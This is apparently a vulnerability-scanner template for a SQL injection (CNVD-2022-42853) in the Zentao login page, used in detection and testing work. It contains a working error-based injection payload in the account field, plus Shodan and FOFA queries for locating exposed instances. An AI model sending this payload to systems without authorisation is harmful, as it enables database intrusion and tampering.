id: CNVD-2022-42853

info:
  name: Zentao 禅道SQL注入
  author: ling
  severity: critical
  description: |
    禅道 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
  reference:
    - https://github.com/z92g/ZentaoSqli/blob/master/CNVD-2022-42853.go
  metadata:
    max-request: 1
    verified: true
    shodan-query: http.title:"zentao"
    fofa-query: "Zentao"
  tags: zentao

variables:
  num: "999999999"

http:
  - raw:
      - |
        POST /zentao/user-login.html HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}/zentao/user-login.html

        account=admin'+and++updatexml(1,concat(0x1,md5({{num}})),1)+and+'1'='1

    matchers:
      - type: word
        part: body
        words:
          - 'c8c605999f3d8352d7bb792cf3fdb25'

# Enhanced by mp on 2022/09/28
